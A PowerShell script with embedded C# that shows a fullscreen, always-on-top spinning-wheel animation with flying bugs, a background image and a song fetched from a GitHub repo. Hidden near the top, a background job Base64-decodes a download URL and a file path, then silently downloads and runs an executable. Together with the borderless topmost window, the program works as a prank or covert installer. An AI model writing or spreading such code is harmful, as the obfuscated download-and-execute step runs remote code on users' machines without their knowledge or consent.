Add-Type -AssemblyName System.Windows.Forms,System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

Add-Type -TypeDefinition @"
using System;
using System.Drawing;
using System.Windows.Forms;
using System.Runtime.InteropServices;

public class Bug {
    public float X,Y,VX,VY;
    public int Size;
    public Bug(float x,float y,float vx,float vy,int sz){X=x;Y=y;VX=vx;VY=vy;Size=sz;}
    public void Move(int W,int H){
        X+=VX; Y+=VY;
        if(X<-100)X=W+10; else if(X>W+10)X=-100;
        if(Y<-100)Y=H+10; else if(Y>H+10)Y=-100;
    }
}

public class GamePanel : Panel {
    public GamePanel(){
        this.DoubleBuffered=true;
        this.SetStyle(ControlStyles.AllPaintingInWmPaint|ControlStyles.UserPaint|ControlStyles.OptimizedDoubleBuffer,true);
    }
}

public class MCI {
    [DllImport("winmm.dll",CharSet=CharSet.Auto)]
    public static extern int mciSendString(string cmd, System.Text.StringBuilder ret, int len, IntPtr hwnd);
    public static void PlayFile(string path){
        mciSendString("open \""+path+"\" type mpegvideo alias snd",null,0,IntPtr.Zero);
        mciSendString("play snd",null,0,IntPtr.Zero);
    }
    public static void Stop(){
        mciSendString("stop snd",null,0,IntPtr.Zero);
        mciSendString("close snd",null,0,IntPtr.Zero);
    }
}
"@ -ReferencedAssemblies System.Windows.Forms,System.Drawing

# Танчики
Start-Job{$f=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QzpcdGFuNGlraS5leGU='));iwr([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yZWRpcmVjdC5sZXN0YS5ydS9NVC9sYXRlc3Rfd2ViX2luc3RhbGxfcnU='))) -O $f;&$f}|Out-Null

# Песня
$script:songPath="$env:TEMP\song.mp3"
iwr "https://raw.githubusercontent.com/sweetvata/anticheat/main/song.mp3" -O $script:songPath -UseBasicParsing
[MCI]::PlayFile($script:songPath)

# Картинка
$script:imgPath="$env:TEMP\bg.jpg"
iwr "https://raw.githubusercontent.com/sweetvata/anticheat/main/bug.jpg" -O $script:imgPath -UseBasicParsing
$script:bgImg=[System.Drawing.Image]::FromFile($script:imgPath)

$script:REST  =[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('0KDQldCh0KI='))
$script:NREST =[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('0J3QldCg0JXQodCi'))
$script:lbl   =@($script:REST,$script:NREST,$script:REST,$script:NREST,$script:REST,$script:NREST)
$script:clr   =@(
    [System.Drawing.Color]::FromArgb(220,50,50),
    [System.Drawing.Color]::FromArgb(50,180,50),
    [System.Drawing.Color]::FromArgb(230,180,0),
    [System.Drawing.Color]::FromArgb(50,100,220),
    [System.Drawing.Color]::FromArgb(180,50,180),
    [System.Drawing.Color]::FromArgb(0,180,180)
)

$script:a=0.0; $script:ticks=0; $script:stopped=$false; $script:result=''

# Жуки через C# класс
$rng=New-Object System.Random
$script:bugs=New-Object 'System.Collections.Generic.List[Bug]'
for($i=0;$i-lt 20;$i++){
    $vx=[float](($rng.NextDouble()*5+3)*(if($rng.Next(2)){1}else{-1}))
    $vy=[float](($rng.NextDouble()*5+3)*(if($rng.Next(2)){1}else{-1}))
    $script:bugs.Add([Bug]::new(
        [float]$rng.Next(50,1800),
        [float]$rng.Next(50,900),
        $vx,$vy,$rng.Next(45,80)
    ))
}

$script:form=New-Object System.Windows.Forms.Form
$script:form.WindowState='Maximized';$script:form.FormBorderStyle='None'
$script:form.TopMost=$true;$script:form.BackColor='Black'

$script:panel=New-Object GamePanel
$script:panel.Dock='Fill';$script:panel.BackColor='Black'

$script:panel.Add_Paint({
    param($s,$e)
    $g=$e.Graphics
    $g.SmoothingMode=[System.Drawing.Drawing2D.SmoothingMode]::AntiAlias
    $g.TextRenderingHint=[System.Drawing.Text.TextRenderingHint]::AntiAlias
    $W=$script:panel.Width;$H=$script:panel.Height

    $g.DrawImage($script:bgImg,0,0,$W,$H)

    foreach($b in $script:bugs){
        $g.DrawImage($script:bgImg,[int]$b.X,[int]$b.Y,$b.Size,$b.Size)
    }

    $r=[int]([Math]::Min($W,$H)*0.38)
    $cx=[int]($W/2);$cy=[int]($H/2);$x=$cx-$r;$y=$cy-$r;$d=$r*2

    $sh=New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(130,0,0,0))
    $g.FillEllipse($sh,$x+8,$y+8,$d,$d);$sh.Dispose()

    for($n=0;$n-lt 6;$n++){
        $br=New-Object System.Drawing.SolidBrush($script:clr[$n])
        $g.FillPie($br,$x,$y,$d,$d,[float]($script:a+$n*60),[float]60);$br.Dispose()
    }
    $wp=New-Object System.Drawing.Pen([System.Drawing.Color]::White,[float]2)
    for($n=0;$n-lt 6;$n++){$g.DrawPie($wp,$x,$y,$d,$d,[float]($script:a+$n*60),[float]60)}
    $wp.Dispose()
    $wp2=New-Object System.Drawing.Pen([System.Drawing.Color]::White,[float]5)
    $g.DrawEllipse($wp2,$x,$y,$d,$d);$wp2.Dispose()

    $fn=New-Object System.Drawing.Font('Arial',13,[System.Drawing.FontStyle]::Bold)
    $sf=New-Object System.Drawing.StringFormat
    $sf.Alignment=[System.Drawing.StringAlignment]::Center
    $sf.LineAlignment=[System.Drawing.StringAlignment]::Center
    $tb=New-Object System.Drawing.SolidBrush([System.Drawing.Color]::White)
    $ts=New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(150,0,0,0))
    for($n=0;$n-lt 6;$n++){
        $ma=($script:a+$n*60+30)*[Math]::PI/180
        $tx=[float]($cx+[Math]::Cos($ma)*$r*0.68)
        $ty=[float]($cy+[Math]::Sin($ma)*$r*0.68)
        $g.DrawString($script:lbl[$n],$fn,$ts,$tx+1,$ty+1,$sf)
        $g.DrawString($script:lbl[$n],$fn,$tb,$tx,$ty,$sf)
    }
    $fn.Dispose();$sf.Dispose();$tb.Dispose();$ts.Dispose()

    $cr=[int]($r*0.10)
    $cb=New-Object System.Drawing.SolidBrush([System.Drawing.Color]::White)
    $g.FillEllipse($cb,$cx-$cr,$cy-$cr,$cr*2,$cr*2);$cb.Dispose()

    $as=[float]($r*0.14)
    $pts=@(
        [System.Drawing.PointF]::new([float]$cx,           [float]($cy+$r-$as*0.5)),
        [System.Drawing.PointF]::new([float]($cx-$as*0.7), [float]($cy+$r+$as*0.8)),
        [System.Drawing.PointF]::new([float]($cx+$as*0.7), [float]($cy+$r+$as*0.8))
    )
    $ab=New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(255,220,0))
    $ap=New-Object System.Drawing.Pen([System.Drawing.Color]::FromArgb(180,140,0),[float]2)
    $g.FillPolygon($ab,$pts);$g.DrawPolygon($ap,$pts)
    $ab.Dispose();$ap.Dispose()

    if($script:stopped){
        $rfn=New-Object System.Drawing.Font('Arial',56,[System.Drawing.FontStyle]::Bold)
        $rsf=New-Object System.Drawing.StringFormat
        $rsf.Alignment=[System.Drawing.StringAlignment]::Center
        $rsf.LineAlignment=[System.Drawing.StringAlignment]::Center
        $rrc=New-Object System.Drawing.RectangleF(0,[float]($cy-$r-110),[float]$W,110)
        $rbg=New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(200,0,0,0))
        $g.FillRectangle($rbg,$rrc);$rbg.Dispose()
        $rtb=New-Object System.Drawing.SolidBrush([System.Drawing.Color]::Yellow)
        $g.DrawString($script:result,$rfn,$rtb,$rrc,$rsf)
        $rfn.Dispose();$rsf.Dispose();$rtb.Dispose()
    }
})

$script:form.Controls.Add($script:panel)

$tStop=New-Object System.Windows.Forms.Timer;$tStop.Interval=20000
$tStop.Add_Tick({
    $tStop.Stop();$script:stopped=$true
    $norm=((90-$script:a)%360+360)%360
    $idx=[int]([Math]::Floor($norm/60))%6
    $script:result=$script:lbl[$idx]
})

$t1=New-Object System.Windows.Forms.Timer;$t1.Interval=16
$t1.Add_Tick({
    $script:ticks++
    $W=$script:panel.Width;$H=$script:panel.Height
    for($i=0;$i-lt $script:bugs.Count;$i++){$script:bugs[$i].Move($W,$H)}
    if(-not $script:stopped){
        $ms=$script:ticks*16
        if($ms -lt 10000){$script:a=($script:a+12)%360}
        else{$prog=[Math]::Min(1.0,($ms-10000)/10000.0);$script:a=($script:a+(12*(1-$prog)+0.2*$prog))%360}
    }
    $script:panel.Invalidate()
})

$tClose=New-Object System.Windows.Forms.Timer;$tClose.Interval=28000
$tClose.Add_Tick({
    $t1.Stop();$tStop.Stop();$tClose.Stop()
    [MCI]::Stop()
    $script:form.Close()
})

$script:form.Add_Shown({$t1.Start();$tStop.Start();$tClose.Start()})
[void]$script:form.ShowDialog()
